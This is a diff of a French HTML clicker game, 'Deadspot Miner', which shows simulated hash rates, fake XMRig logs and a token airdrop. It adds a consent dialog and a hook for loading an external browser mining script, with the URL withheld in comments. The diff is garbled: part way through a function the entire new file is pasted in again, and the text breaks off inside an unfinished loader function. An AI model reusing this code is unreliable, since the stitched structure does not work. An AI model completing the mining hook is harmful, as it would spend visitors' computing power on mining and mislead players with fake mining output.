@@ -1,117 +1,171 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <title>Deadspot Miner + Clicker</title>
+  <meta charset="UTF-8" />
+  <title>💀 Deadspot Miner + Clicker</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Creepster&family=Share+Tech+Mono&display=swap');
+
+    /* ---- BASE ---- */
+    :root{
+      --bg1:#190000; --bg2:#000;
+      --accent:#ff3333; --muted:#aaa;
+      --panel:#0d0000; --panel-border:#330000;
+    }
+    html,body{height:100%; margin:0}
     body {
-      background:#0d0d0d;
-      color:#eee;
-      font-family: monospace;
+      background: radial-gradient(circle at top, var(--bg1) 0%, var(--bg2) 100%);
+      color: #f1f1f1;
+      font-family: 'Share Tech Mono', monospace;
       text-align: center;
-      padding: 20px;
+      padding: 28px;
+      background-image: url('https://www.transparenttextures.com/patterns/dark-mosaic.png');
+      background-blend-mode: multiply;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
     }
-    h1 { color:#4caf50; }
-    #deadspotBalance { font-size:22px; margin:10px; color:#ffd700; }
-    #energyBar {
-      width: 300px; height: 20px; border:1px solid #444; margin:10px auto;
-      background:#222; border-radius:5px; overflow:hidden;
-    }
-    #energyFill { height:100%; width:100%; background:#4caf50; }
 
-    /* Bouton clicker personnalisé */
+    h1{
+      font-family: 'Creepster', cursive;
+      color: var(--accent);
+      text-shadow: 0 0 15px #ff0000, 0 0 40px #990000;
+      letter-spacing:2px;
+      margin:0 0 10px;
+      font-size:2.6rem;
+    }
+    h2,h3{ color: var(--accent); text-shadow:0 0 10px #ff0000; }
+
+    /* BALANCE */
+    #deadspotBalance{
+      font-size:20px; margin:12px 0; color:#ffe066; text-shadow:0 0 8px #ff0000;
+    }
+
+    /* BARS */
+    .bar {
+      width: 320px; max-width:90%; height:24px;
+      margin: 12px auto; border-radius:10px;
+      border:2px solid var(--panel-border);
+      background: linear-gradient(90deg,#1a0000,#330000);
+      box-shadow: inset 0 0 15px #ff000022;
+      overflow:hidden;
+    }
+    #energyFill, #exchangeFill {
+      height:100%; width:0%;
+      transition: width .35s ease;
+      box-shadow: 0 0 14px #ff0000;
+    }
+    #energyFill { background: linear-gradient(90deg,#ff4444,#990000); }
+    #exchangeFill{ background: linear-gradient(90deg,#ff0000,#660000); }
+
+    /* CLICKER */
     #clickBtn {
-      width: 220px;
-      height: 220px;
-      border-radius: 50%;
-      background: #111;
-      border: 3px solid #444;
-      margin: 20px auto;
-      cursor: pointer;
-      position: relative;
-      overflow: hidden;
+      width: 240px; height:240px; border-radius:50%;
+      margin: 28px auto; border:3px solid #aa0000;
+      box-shadow: 0 0 25px #ff0000aa, inset 0 0 10px #330000;
+      background: radial-gradient(circle at center,#1a0000 10%,#000 90%);
+      position:relative; cursor:pointer; transition:.18s;
     }
-    #clickBtn img {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-    }
-    #clickBtn:hover {
-      transform: scale(1.05);
-      border-color: #f00;
-    }
+    #clickBtn:hover{ transform:scale(1.06); border-color:#ff3333; }
+    #clickBtn img{ width:100%; height:100%; opacity:.92; filter:drop-shadow(0 0 8px #ff0000); border-radius:50%; }
 
-    button {
-      background:#333; color:#eee; padding:10px 20px; border:none;
-      border-radius:5px; margin:5px; cursor:pointer;
+    /* BUTTONS */
+    .btn {
+      background: linear-gradient(180deg,#330000,#110000);
+      color:#f5f5f5; border:2px solid #660000; border-radius:8px;
+      padding:10px 16px; margin:8px; cursor:pointer; text-transform:uppercase;
+      letter-spacing:1px; transition:.25s;
+      font-family:'Share Tech Mono', monospace;
     }
-    button:hover { background:#555; }
+    .btn:hover{ background:linear-gradient(180deg,#550000,#220000); border-color:#ff0000; box-shadow:0 0 10px #ff0000aa; }
 
-    canvas {
-      margin-top: 20px; background: #1a1a1a; border: 1px solid #333; border-radius: 10px;
-    }
-    #xmrigLogs {
-      margin-top:20px; max-height:250px; overflow-y:auto; background:#111;
-      border:1px solid #444; padding:10px; text-align:left; font-size:13px;
-    }
-    .logAccepted { color:#4caf50; }
-    .logRejected { color:#f44336; }
+    /* LAYOUT */
+    .panel{ background:var(--panel); border:2px solid var(--panel-border); padding:12px; margin:14px auto; width:920px; max-width:96%; border-radius:12px; box-shadow:0 6px 40px #000; text-align:center;}
+    canvas{ margin-top:18px; background:#0a0000; border:2px solid #440000; border-radius:10px; box-shadow:0 0 15px #99000033; display:block; margin-left:auto; margin-right:auto; }
 
-    /* Progression échange */
-    #exchangeProgress {
-      width: 300px;
-      height: 20px;
-      border: 1px solid #444;
-      background: #222;
-      border-radius: 5px;
-      margin: 10px auto;
-      overflow: hidden;
+    #xmrigLogs{
+      margin-top:12px; max-height:260px; overflow:auto; text-align:left;
+      background:#0d0000; border-radius:8px; padding:10px; font-size:13px; border:2px solid #330000;
+      box-shadow: inset 0 0 15px #ff000022;
     }
-    #exchangeFill {
-      height: 100%;
-      width: 0%;
-      background: #ff0000;
+    .logAccepted{ color:#55ff55 } .logRejected{ color:#ff7777 }
+
+    footer{ margin-top:18px; color:var(--muted) }
+
+    /* CONSENT MODAL (simple) */
+    .consent-backdrop{ position:fixed; inset:0; background:#000000aa; display:none; align-items:center; justify-content:center; z-index:9999; }
+    .consent-box{ background:#120000; border:2px solid #440000; padding:20px; border-radius:10px; width:420px; max-width:92%; text-align:left; color:#eee; box-shadow:0 8px 40px #000; }
+    .consent-actions{ text-align:right; margin-top:12px; }
+
+    @media (max-width:600px){
+      h1{ font-size:2rem } #clickBtn{ width:200px; height:200px }
     }
   </style>
 </head>
 <body>
-  <h1>💎 Deadspot Miner + Clicker Game</h1>
-  <div id="deadspotBalance">Deadspot: 0</div>
-  <div id="energyBar"><div id="energyFill"></div></div>
+  <h1>💀 Deadspot Miner + Clicker Game</h1>
 
-  <!-- Bouton avec tête de mort diabolique intégrée -->
-  <div id="clickBtn">
-    <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjIwIiBoZWlnaHQ9IjIyMCIgdmlld0JveD0iMCAwIDI0MCAyNDAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CiAgPHBhdGggZD0iTTExMiwyMGMyNywtMyw1NywyMSw2MCw0OGwzLDk2Yy0yLDEyLC0xMiwyMiwtMjQsMjJsLTI0LDBjLTEyLDAtMjYsLTEwLC0yNCwtMjJsMy05NmMyLC0yNywyNywtNTEsNTQtNDh6IiBmaWxsPSIjZmYwMDAwIi8+CiAgPGNpcmNsZSBjeD0iOTAiIGN5PSIxMDAiIHI9IjEwIiBmaWxsPSIjMDAwMDAwIi8+CiAgPGNpcmNsZSBjeD0iMTUwIiBjeT0iMTAwIiByPSIxMCIgZmlsbD0iIzAwMDAwMCIvPgo8L3N2Zz4=" alt="skull">
+  <div class="panel" style="padding-bottom:6px;">
+    <div id="deadspotBalance">Deadspot: 0</div>
+    <div class="bar" id="energyBar"><div id="energyFill" style="width:100%"></div></div>
+
+    <div id="clickBtn" title="Clique pour gagner">
+      <!-- skull inline SVG (safe) -->
+      <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjIwIiBoZWlnaHQ9IjIyMCIgdmlld0JveD0iMCAwIDI0MCAyNDAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CiAgPHBhdGggZD0iTTExMiwyMGMyNywtMyw1NywyMSw2MCw0OGwzLDk2Yy0yLDEyLC0xMiwyMiwtMjQsMjJsLTI0LDBjLTEyLDAtMjYsLTEwLC0yNCwtMjJsMy05NmMyLC0yNywyNywtNTEsNTQtNDh6IiBmaWxsPSIjZmYwMDAwIi8+CiAgPGNpcmNsZSBjeD0iOTAiIGN5PSIxMDAiIHI9IjEwIiBmaWxsPSIjMDAwMDAwIi8+CiAgPGNpcmNsZSBjeD0iMTUwIiBjeT0iMTAwIiByPSIxMCIgZmlsbD0iIzAwMDAwMCIvPgo8L3N2Zz4=" alt="skull">
+    </div>
+
+    <div style="margin-top:6px;">
+      <button id="exchangeBtn" class="btn">🩸 Convertir Hashes → Deadspot</button>
+      <button id="openConsent" class="btn">⚠️ Activer miner (consentement)</button>
+    </div>
+
+    <div class="bar" id="exchangeProgress"><div id="exchangeFill"></div></div>
+
+    <h2>📊 Hashrate</h2>
+    <div id="currentHps">H/s: 0.00</div>
+    <div id="totalHashes">Total Hashes: 0</div>
+    <canvas id="hashrateChart" width="600" height="200"></canvas>
+
+    <h2>📜 Logs XMRig (simulés)</h2>
+    <div id="xmrigLogs"></div>
+
+    <h3>⚡ Améliorations</h3>
+    <div style="margin-bottom:6px;">
+      <button onclick="buyUpgrade('x2')" class="btn">x2 Click (Coût: 5 DSC)</button>
+      <button onclick="buyUpgrade('auto')" class="btn">Auto-Click (Coût: 10 DSC)</button>
+      <button onclick="buyUpgrade('regen')" class="btn">Énergie+ (Coût: 8 DSC)</button>
+      <button onclick="buyUpgrade('multi')" class="btn">x5 Revenus (Coût: 20 DSC)</button>
+    </div>
+
+    <p style="color:#bbb">🚀 Airdrop Deadspot prévu le <b>29 mars 2026</b></p>
   </div>
 
-  <button id="exchangeBtn">🔄 Convertir Hashes → Deadspot</button>
+  <footer>
+    <small>Site de démonstration — simule le minage pour l'interface utilisateur.</small>
+  </footer>
 
-  <!-- Barre progression Hashes -->
-  <div id="exchangeProgress"><div id="exchangeFill"></div></div>
-
-  <h2>📊 Hashrate</h2>
-  <div id="currentHps">H/s: 0.00</div>
-  <div id="totalHashes">Total Hashes: 0</div>
-  <canvas id="hashrateChart" width="600" height="200"></canvas>
-
-  <h2>📜 Logs XMRig</h2>
-  <div id="xmrigLogs"></div>
-
-  <h3>⚡ Améliorations</h3>
-  <button onclick="buyUpgrade('x2')">x2 Click (Coût: 5 DSC)</button>
-  <button onclick="buyUpgrade('auto')">Auto-Click (Coût: 10 DSC)</button>
-  <button onclick="buyUpgrade('regen')">Énergie+ (Coût: 8 DSC)</button>
-  <button onclick="buyUpgrade('multi')">x5 Revenus (Coût: 20 DSC)</button>
-
-  <p style="margin-top:20px; color:#aaa;">
-    🚀 Deadspot-Token Airdrop prévu le <b>29 mars 2026</b>
-  </p>
+  <!-- CONSENT MODAL -->
+  <div class="consent-backdrop" id="consentBackdrop">
+    <div class="consent-box">
+      <h3 style="margin-top:0;color:var(--accent)">Activer le script externe de minage</h3>
+      <p>
+        En cliquant <b>Accepter</b>, vous autorisez le chargement d'un script externe qui exécutera du calcul dans le navigateur.
+        Assurez-vous d'avoir obtenu le consentement explicite de vos visiteurs avant de l'activer sur le site public.
+      </p>
+      <p style="font-size:13px;color:var(--muted)">Si tu veux charger un script externe toi-même, je t'explique ci-dessous où le placer.</p>
+      <div class="consent-actions">
+        <button id="cancelConsent" class="btn" style="background:#222;border-color:#333">Annuler</button>
+        <button id="confirmConsent" class="btn" style="background:linear-gradient(180deg,#880000,#440000);">Accepter et charger</button>
+      </div>
+    </div>
+  </div>
 
   <!-- Chart.js -->
   <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
 
-  <!-- Script minage fonctionnel -->
+  <!-- ---------- SCRIPT PRINCIPAL (similaire au tien, inchangé mais encapsulé) ---------- -->
   <script>
+    /* ---------- état de jeu (persisté localStorage) ---------- */
     let deadspot = parseFloat(localStorage.getItem("deadspot")) || 0;
     let upgrades = JSON.parse(localStorage.getItem("upgrades")) || {x2:false, auto:false, regen:false, multi:false};
     let energy = 100, maxEnergy = 100;
@@ -120,128 +174,394 @@
     let autoClickInterval = null;
 
     // Hashes simulés
-    let totalHashes = parseInt(localStorage.getItem("totalHashes")) || 0;
+    let totalHashes = parseFloat(localStorage.getItem("totalHashes")) || 0;
     let currentHps = 0;
     let threads = 4;
 
     function saveGame() {
-        localStorage.setItem("deadspot", deadspot);
-        localStorage.setItem("upgrades", JSON.stringify(upgrades));
-        localStorage.setItem("totalHashes", totalHashes);
+      localStorage.setItem("deadspot", deadspot);
+      localStorage.setItem("upgrades", JSON.stringify(upgrades));
+      localStorage.setItem("totalHashes", totalHashes);
     }
 
     function updateUI() {
-        document.getElementById("deadspotBalance").textContent = "Deadspot: " + deadspot.toFixed(5);
-        document.getElementById("energyFill").style.width = (energy/maxEnergy*100) + "%";
-        const percent = Math.min(100, totalHashes/10000000*100);
-        document.getElementById("exchangeFill").style.width = percent+"%";
+      document.getElementById("deadspotBalance").textContent = "Deadspot: " + deadspot.toFixed(5);
+      document.getElementById("energyFill").style.width = (energy / maxEnergy * 100) + "%";
+      const percent = Math.min(100, totalHashes / 10000000 * 100);
+      document.getElementById("exchangeFill").style.width = percent + "%";
     }
 
     // Click bouton
     document.getElementById("clickBtn").addEventListener("click", () => {
-        if(energy > 0){
-            let gain = clickValue;
-            if(upgrades.x2) gain *= 2;
-            if(upgrades.multi) gain *= 5;
-            deadspot += gain;
-            energy--;
-            updateUI();
-            saveGame();
-        }
+      if (energy > 0) {
+        let gain = clickValue;
+        if (upgrades.x2) gain *= 2;
+        if (upgrades.multi) gain *= 5;
+        deadspot += gain;
+        energy--;
+        updateUI();
+        saveGame();
+      }
     });
 
     // Regénération d'énergie
     setInterval(() => {
-        if (energy < maxEnergy) {
-            energy = Math.min(maxEnergy, energy + regenRate);
-            updateUI();
-        }
+      if (energy < maxEnergy) {
+        energy = Math.min(maxEnergy, energy + regenRate);
+        updateUI();
+      }
     }, 1000);
 
     function startAutoClick() {
-        if(autoClickInterval) return;
-        autoClickInterval = setInterval(() => {
-            if(energy > 0){
-                let gain = clickValue;
-                if(upgrades.x2) gain *= 2;
-                if(upgrades.multi) gain *= 5;
-                deadspot += gain;
-                energy--;
-                updateUI();
-                saveGame();
-            }
-        }, 1000);
+      if (autoClickInterval) return;
+      autoClickInterval = setInterval(() => {
+        if (energy > 0) {
+          let gain = clickValue;
+          if (upgrades.x2) gain *= 2;
+          if (upgrades.multi) gain *= 5;
+          deadspot += gain;
+          energy--;
+          updateUI();
+          saveGame();
+        }
+      }, 1000);
     }
 
-    function buyUpgrade(type){
-        if(type === "x2" && !upgrades.x2 && deadspot >=5){ deadspot -=5; upgrades.x2=true; }
-        if(type === "auto" && !upgrades.auto && deadspot >=10){ deadspot -=10; upgrades.auto=true; startAutoClick(); }
-        if(type === "regen" && !upgrades.regen && deadspot >=8){ deadspot -=8; upgrades.regen=true; regenRate=2; }
-        if(type === "multi" && !upgrades.multi && deadspot >=20){ deadspot -=20; upgrades.multi=true; }
-        saveGame(); updateUI();
+    function buyUpgrade(type) {
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <title>💀 Deadspot Miner + Clicker</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Creepster&family=Share+Tech+Mono&display=swap');
+
+    /* ---- BASE ---- */
+    :root{
+      --bg1:#190000; --bg2:#000;
+      --accent:#ff3333; --muted:#aaa;
+      --panel:#0d0000; --panel-border:#330000;
+    }
+    html,body{height:100%; margin:0}
+    body {
+      background: radial-gradient(circle at top, var(--bg1) 0%, var(--bg2) 100%);
+      color: #f1f1f1;
+      font-family: 'Share Tech Mono', monospace;
+      text-align: center;
+      padding: 28px;
+      background-image: url('https://www.transparenttextures.com/patterns/dark-mosaic.png');
+      background-blend-mode: multiply;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
     }
 
-    // --- Minage simulé ---
+    h1{
+      font-family: 'Creepster', cursive;
+      color: var(--accent);
+      text-shadow: 0 0 15px #ff0000, 0 0 40px #990000;
+      letter-spacing:2px;
+      margin:0 0 10px;
+      font-size:2.6rem;
+    }
+    h2,h3{ color: var(--accent); text-shadow:0 0 10px #ff0000; }
+
+    /* BALANCE */
+    #deadspotBalance{
+      font-size:20px; margin:12px 0; color:#ffe066; text-shadow:0 0 8px #ff0000;
+    }
+
+    /* BARS */
+    .bar {
+      width: 320px; max-width:90%; height:24px;
+      margin: 12px auto; border-radius:10px;
+      border:2px solid var(--panel-border);
+      background: linear-gradient(90deg,#1a0000,#330000);
+      box-shadow: inset 0 0 15px #ff000022;
+      overflow:hidden;
+    }
+    #energyFill, #exchangeFill {
+      height:100%; width:0%;
+      transition: width .35s ease;
+      box-shadow: 0 0 14px #ff0000;
+    }
+    #energyFill { background: linear-gradient(90deg,#ff4444,#990000); }
+    #exchangeFill{ background: linear-gradient(90deg,#ff0000,#660000); }
+
+    /* CLICKER */
+    #clickBtn {
+      width: 240px; height:240px; border-radius:50%;
+      margin: 28px auto; border:3px solid #aa0000;
+      box-shadow: 0 0 25px #ff0000aa, inset 0 0 10px #330000;
+      background: radial-gradient(circle at center,#1a0000 10%,#000 90%);
+      position:relative; cursor:pointer; transition:.18s;
+    }
+    #clickBtn:hover{ transform:scale(1.06); border-color:#ff3333; }
+    #clickBtn img{ width:100%; height:100%; opacity:.92; filter:drop-shadow(0 0 8px #ff0000); border-radius:50%; }
+
+    /* BUTTONS */
+    .btn {
+      background: linear-gradient(180deg,#330000,#110000);
+      color:#f5f5f5; border:2px solid #660000; border-radius:8px;
+      padding:10px 16px; margin:8px; cursor:pointer; text-transform:uppercase;
+      letter-spacing:1px; transition:.25s;
+      font-family:'Share Tech Mono', monospace;
+    }
+    .btn:hover{ background:linear-gradient(180deg,#550000,#220000); border-color:#ff0000; box-shadow:0 0 10px #ff0000aa; }
+
+    /* LAYOUT */
+    .panel{ background:var(--panel); border:2px solid var(--panel-border); padding:12px; margin:14px auto; width:920px; max-width:96%; border-radius:12px; box-shadow:0 6px 40px #000; text-align:center;}
+    canvas{ margin-top:18px; background:#0a0000; border:2px solid #440000; border-radius:10px; box-shadow:0 0 15px #99000033; display:block; margin-left:auto; margin-right:auto; }
+
+    #xmrigLogs{
+      margin-top:12px; max-height:260px; overflow:auto; text-align:left;
+      background:#0d0000; border-radius:8px; padding:10px; font-size:13px; border:2px solid #330000;
+      box-shadow: inset 0 0 15px #ff000022;
+    }
+    .logAccepted{ color:#55ff55 } .logRejected{ color:#ff7777 }
+
+    footer{ margin-top:18px; color:var(--muted) }
+
+    /* CONSENT MODAL (simple) */
+    .consent-backdrop{ position:fixed; inset:0; background:#000000aa; display:none; align-items:center; justify-content:center; z-index:9999; }
+    .consent-box{ background:#120000; border:2px solid #440000; padding:20px; border-radius:10px; width:420px; max-width:92%; text-align:left; color:#eee; box-shadow:0 8px 40px #000; }
+    .consent-actions{ text-align:right; margin-top:12px; }
+
+    @media (max-width:600px){
+      h1{ font-size:2rem } #clickBtn{ width:200px; height:200px }
+    }
+  </style>
+</head>
+<body>
+  <h1>💀 Deadspot Miner + Clicker Game</h1>
+
+  <div class="panel" style="padding-bottom:6px;">
+    <div id="deadspotBalance">Deadspot: 0</div>
+    <div class="bar" id="energyBar"><div id="energyFill" style="width:100%"></div></div>
+
+    <div id="clickBtn" title="Clique pour gagner">
+      <!-- skull inline SVG (safe) -->
+      <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjIwIiBoZWlnaHQ9IjIyMCIgdmlld0JveD0iMCAwIDI0MCAyNDAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CiAgPHBhdGggZD0iTTExMiwyMGMyNywtMyw1NywyMSw2MCw0OGwzLDk2Yy0yLDEyLC0xMiwyMiwtMjQsMjJsLTI0LDBjLTEyLDAtMjYsLTEwLC0yNCwtMjJsMy05NmMyLC0yNywyNywtNTEsNTQtNDh6IiBmaWxsPSIjZmYwMDAwIi8+CiAgPGNpcmNsZSBjeD0iOTAiIGN5PSIxMDAiIHI9IjEwIiBmaWxsPSIjMDAwMDAwIi8+CiAgPGNpcmNsZSBjeD0iMTUwIiBjeT0iMTAwIiByPSIxMCIgZmlsbD0iIzAwMDAwMCIvPgo8L3N2Zz4=" alt="skull">
+    </div>
+
+    <div style="margin-top:6px;">
+      <button id="exchangeBtn" class="btn">🩸 Convertir Hashes → Deadspot</button>
+      <button id="openConsent" class="btn">⚠️ Activer miner (consentement)</button>
+    </div>
+
+    <div class="bar" id="exchangeProgress"><div id="exchangeFill"></div></div>
+
+    <h2>📊 Hashrate</h2>
+    <div id="currentHps">H/s: 0.00</div>
+    <div id="totalHashes">Total Hashes: 0</div>
+    <canvas id="hashrateChart" width="600" height="200"></canvas>
+
+    <h2>📜 Logs XMRig (simulés)</h2>
+    <div id="xmrigLogs"></div>
+
+    <h3>⚡ Améliorations</h3>
+    <div style="margin-bottom:6px;">
+      <button onclick="buyUpgrade('x2')" class="btn">x2 Click (Coût: 5 DSC)</button>
+      <button onclick="buyUpgrade('auto')" class="btn">Auto-Click (Coût: 10 DSC)</button>
+      <button onclick="buyUpgrade('regen')" class="btn">Énergie+ (Coût: 8 DSC)</button>
+      <button onclick="buyUpgrade('multi')" class="btn">x5 Revenus (Coût: 20 DSC)</button>
+    </div>
+
+    <p style="color:#bbb">🚀 Airdrop Deadspot prévu le <b>29 mars 2026</b></p>
+  </div>
+
+  <footer>
+    <small>Site de démonstration — simule le minage pour l'interface utilisateur.</small>
+  </footer>
+
+  <!-- CONSENT MODAL -->
+  <div class="consent-backdrop" id="consentBackdrop">
+    <div class="consent-box">
+      <h3 style="margin-top:0;color:var(--accent)">Activer le script externe de minage</h3>
+      <p>
+        En cliquant <b>Accepter</b>, vous autorisez le chargement d'un script externe qui exécutera du calcul dans le navigateur.
+        Assurez-vous d'avoir obtenu le consentement explicite de vos visiteurs avant de l'activer sur le site public.
+      </p>
+      <p style="font-size:13px;color:var(--muted)">Si tu veux charger un script externe toi-même, je t'explique ci-dessous où le placer.</p>
+      <div class="consent-actions">
+        <button id="cancelConsent" class="btn" style="background:#222;border-color:#333">Annuler</button>
+        <button id="confirmConsent" class="btn" style="background:linear-gradient(180deg,#880000,#440000);">Accepter et charger</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Chart.js -->
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+
+  <!-- ---------- SCRIPT PRINCIPAL (similaire au tien, inchangé mais encapsulé) ---------- -->
+  <script>
+    /* ---------- état de jeu (persisté localStorage) ---------- */
+    let deadspot = parseFloat(localStorage.getItem("deadspot")) || 0;
+    let upgrades = JSON.parse(localStorage.getItem("upgrades")) || {x2:false, auto:false, regen:false, multi:false};
+    let energy = 100, maxEnergy = 100;
+    let regenRate = upgrades.regen ? 2 : 1;
+    let clickValue = 0.00015;
+    let autoClickInterval = null;
+
+    // Hashes simulés
+    let totalHashes = parseFloat(localStorage.getItem("totalHashes")) || 0;
+    let currentHps = 0;
+    let threads = 4;
+
+    function saveGame() {
+      localStorage.setItem("deadspot", deadspot);
+      localStorage.setItem("upgrades", JSON.stringify(upgrades));
+      localStorage.setItem("totalHashes", totalHashes);
+    }
+
+    function updateUI() {
+      document.getElementById("deadspotBalance").textContent = "Deadspot: " + deadspot.toFixed(5);
+      document.getElementById("energyFill").style.width = (energy / maxEnergy * 100) + "%";
+      const percent = Math.min(100, totalHashes / 10000000 * 100);
+      document.getElementById("exchangeFill").style.width = percent + "%";
+    }
+
+    // Click bouton
+    document.getElementById("clickBtn").addEventListener("click", () => {
+      if (energy > 0) {
+        let gain = clickValue;
+        if (upgrades.x2) gain *= 2;
+        if (upgrades.multi) gain *= 5;
+        deadspot += gain;
+        energy--;
+        updateUI();
+        saveGame();
+      }
+    });
+
+    // Regénération d'énergie
+    setInterval(() => {
+      if (energy < maxEnergy) {
+        energy = Math.min(maxEnergy, energy + regenRate);
+        updateUI();
+      }
+    }, 1000);
+
+    function startAutoClick() {
+      if (autoClickInterval) return;
+      autoClickInterval = setInterval(() => {
+        if (energy > 0) {
+          let gain = clickValue;
+          if (upgrades.x2) gain *= 2;
+          if (upgrades.multi) gain *= 5;
+          deadspot += gain;
+          energy--;
+          updateUI();
+          saveGame();
+        }
+      }, 1000);
+    }
+
+    function buyUpgrade(type) {
+      if (type === "x2" && !upgrades.x2 && deadspot >= 5) { deadspot -= 5; upgrades.x2 = true; }
+      if (type === "auto" && !upgrades.auto && deadspot >= 10) { deadspot -= 10; upgrades.auto = true; startAutoClick(); }
+      if (type === "regen" && !upgrades.regen && deadspot >= 8) { deadspot -= 8; upgrades.regen = true; regenRate = 2; }
+      if (type === "multi" && !upgrades.multi && deadspot >= 20) { deadspot -= 20; upgrades.multi = true; }
+      saveGame(); updateUI();
+    }
+
+    // --- Minage simulé (hashes & logs) ---
     const currentHpsDisplay = document.getElementById("currentHps");
     const totalHashesDisplay = document.getElementById("totalHashes");
     const xmrigLogs = document.getElementById("xmrigLogs");
     const ctx = document.getElementById('hashrateChart').getContext('2d');
     const hashrateChart = new Chart(ctx, {
-        type: 'line',
-        data: { labels: [], datasets: [{label:'H/s', data:[], borderColor:'#4caf50', fill:true, tension:0.3}] },
-        options: { responsive:false, animation:false, plugins:{legend:{labels:{color:'#eee'}}},
-            scales:{ x:{ticks:{color:'#aaa'}}, y:{ticks:{color:'#aaa'}} } }
+      type: 'line',
+      data: { labels: [], datasets: [{ label: 'H/s', data: [], borderColor: '#ff3333', fill: true, tension: 0.3, backgroundColor: '#33000066' }] },
+      options: { responsive: false, animation: false, plugins: { legend: { labels: { color: '#eee' } } }, scales: { x: { ticks: { color: '#aaa' } }, y: { ticks: { color: '#aaa' } } } }
     });
 
     let time = 0;
     setInterval(() => {
-        let totalThisSecond = 0;
-        for(let i=0;i<threads;i++){
-            const coreHps = Math.random()*50 + 50;
-            totalThisSecond += coreHps;
-            const isAccepted = Math.random()>0.05;
-            const logLine = `[${new Date().toLocaleTimeString()}] Core #${i} | ${coreHps.toFixed(2)} H/s | ${isAccepted?"Accepted":"Rejected"}`;
-            const span = document.createElement("span");
-            span.className = isAccepted?"logAccepted":"logRejected";
-            span.textContent = logLine;
-            xmrigLogs.appendChild(span);
-            xmrigLogs.appendChild(document.createElement("br"));
-        }
-        currentHps = totalThisSecond;
-        totalHashes += totalThisSecond;
+      let totalThisSecond = 0;
+      for (let i = 0; i < threads; i++) {
+        const coreHps = Math.random() * 50 + 50;
+        totalThisSecond += coreHps;
+        const isAccepted = Math.random() > 0.05;
+        const logLine = `[${new Date().toLocaleTimeString()}] Core #${i} | ${coreHps.toFixed(2)} H/s | ${isAccepted ? "Accepted" : "Rejected"}`;
+        const span = document.createElement("span");
+        span.className = isAccepted ? "logAccepted" : "logRejected";
+        span.textContent = logLine;
+        xmrigLogs.appendChild(span);
+        xmrigLogs.appendChild(document.createElement("br"));
+      }
+      currentHps = totalThisSecond;
+      totalHashes += totalThisSecond;
+      currentHpsDisplay.textContent = "H/s: " + currentHps.toFixed(2);
+      totalHashesDisplay.textContent = "Total Hashes: " + Math.floor(totalHashes);
+      hashrateChart.data.labels.push(time + "s");
+      hashrateChart.data.datasets[0].data.push(currentHps);
+      if (hashrateChart.data.labels.length > 20) {
+        hashrateChart.data.labels.shift();
+        hashrateChart.data.datasets[0].data.shift();
+      }
+      hashrateChart.update();
+      updateUI();
+      saveGame();
+      time++;
+    }, 1000);
 
-        currentHpsDisplay.textContent = "H/s: "+currentHps.toFixed(2);
-        totalHashesDisplay.textContent = "Total Hashes: "+Math.floor(totalHashes);
-
-        hashrateChart.data.labels.push(time+"s");
-        hashrateChart.data.datasets[0].data.push(currentHps);
-        if(hashrateChart.data.labels.length > 20){
-            hashrateChart.data.labels.shift();
-            hashrateChart.data.datasets[0].data.shift();
-        }
-        hashrateChart.update();
-
-        updateUI();
-        saveGame();
-        time++;
-    },1000);
-
-    // Échange Hashes → Deadspot
-    document.getElementById("exchangeBtn").addEventListener("click",()=>{
-        if(totalHashes>=10000000){
-            const dscGain = Math.floor(totalHashes/10000000);
-            deadspot += dscGain;
-            totalHashes %= 10000000;
-            updateUI(); saveGame();
-            alert("Échange réussi: +" + dscGain + " DSC");
-        }else{
-            alert("Pas assez de hashes (min 10M)");
-        }
+    document.getElementById("exchangeBtn").addEventListener("click", () => {
+      if (totalHashes >= 10000000) {
+        const dscGain = Math.floor(totalHashes / 10000000);
+        deadspot += dscGain;
+        totalHashes %= 10000000;
+        updateUI(); saveGame();
+        alert("Échange réussi: +" + dscGain + " DSC");
+      } else {
+        alert("Pas assez de hashes (min 10M)");
+      }
     });
 
-    // Démarrage auto click si déjà acheté
-    if(upgrades.auto) startAutoClick();
+    if (upgrades.auto) startAutoClick();
     updateUI();
+
+    /* ---------- Gestion du consentement et chargement dynamique d'un script externe (SÉCURISÉ, toi-même ajoute l'URL) ---------- */
+
+    const consentBackdrop = document.getElementById('consentBackdrop');
+    const openConsentBtn = document.getElementById('openConsent');
+    const cancelConsentBtn = document.getElementById('cancelConsent');
+    const confirmConsentBtn = document.getElementById('confirmConsent');
+
+    openConsentBtn.addEventListener('click', () => { consentBackdrop.style.display = 'flex'; });
+    cancelConsentBtn.addEventListener('click', () => { consentBackdrop.style.display = 'none'; });
+
+    confirmConsentBtn.addEventListener('click', () => {
+      consentBackdrop.style.display = 'none';
+      // ---------- IMPORTANT ----------
+      // Ici on appelle loadExternalScript avec l'URL du script à charger.
+      // JE NE FOURNIRAI PAS l'URL du script de minage. Si tu veux charger le script toi-même,
+      // remplace 'PUT_YOUR_SCRIPT_URL_HERE' par l'URL complète (ex: "https://example.com/script.js").
+      // N'active ceci que si tu as le droit et le consentement des visiteurs.
+      //
+      // Exemple d'appel (décommenter et remplacer l'URL) :
+      // loadExternalScript('https://put-the-script-url-here.example/script.js');
+      //
+      // REMARQUE : je ne fournis pas ni n'active de scripts de minage pour des raisons de sécurité.
+      alert("Consentement enregistré. Pour charger le script externe, édite la page et décommente l'appel à loadExternalScript() dans le code-source.");
+    });
+
+    function loadExternalScript(scriptUrl){
